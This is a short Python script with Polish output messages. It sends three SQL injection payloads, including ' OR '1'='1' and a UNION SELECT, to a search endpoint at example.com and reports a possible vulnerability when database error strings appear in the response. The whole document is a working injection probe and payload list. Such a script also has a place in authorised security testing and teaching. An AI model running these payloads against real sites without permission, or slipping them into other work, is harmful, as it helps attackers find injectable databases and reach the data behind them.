import requests

url = "http://example.com/search"
payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL, NULL--"]

for payload in payloads:
    params = {"query": payload}
    response = requests.get(url, params=params)
    if "SQL syntax" in response.text or "mysql_fetch" in response.text or "ORA-" in response.text:
        print(f"[!] Możliwa podatność SQL Injection dla payloadu: {payload}")
    else:
        print(f"[-] Brak reakcji na payload: {payload}")
